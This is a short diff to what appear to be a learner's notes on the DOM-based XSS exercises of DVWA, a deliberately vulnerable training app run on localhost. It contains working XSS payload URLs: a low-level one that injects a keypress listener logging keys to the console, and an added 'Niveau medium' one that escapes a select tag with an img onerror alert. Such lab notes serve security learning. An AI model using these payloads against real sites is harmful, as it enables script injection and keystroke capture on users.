@@ -34,3 +34,8 @@ http://127.0.0.1:4280/vulnerabilities/xss_d/?default=<script>document.querySelec
 window.addEventListener("keypress", function(e){ console.log(e.key) })
 
 http://127.0.0.1:4280/vulnerabilities/xss_d/?default=<script>window.addEventListener("keypress", function(e){ console.log(e.key) })</script>
+
+
+# Niveau medium
+
+http://127.0.0.1:4280/vulnerabilities/xss_d/?default=</select><img src='' onerror='alert(1)'>
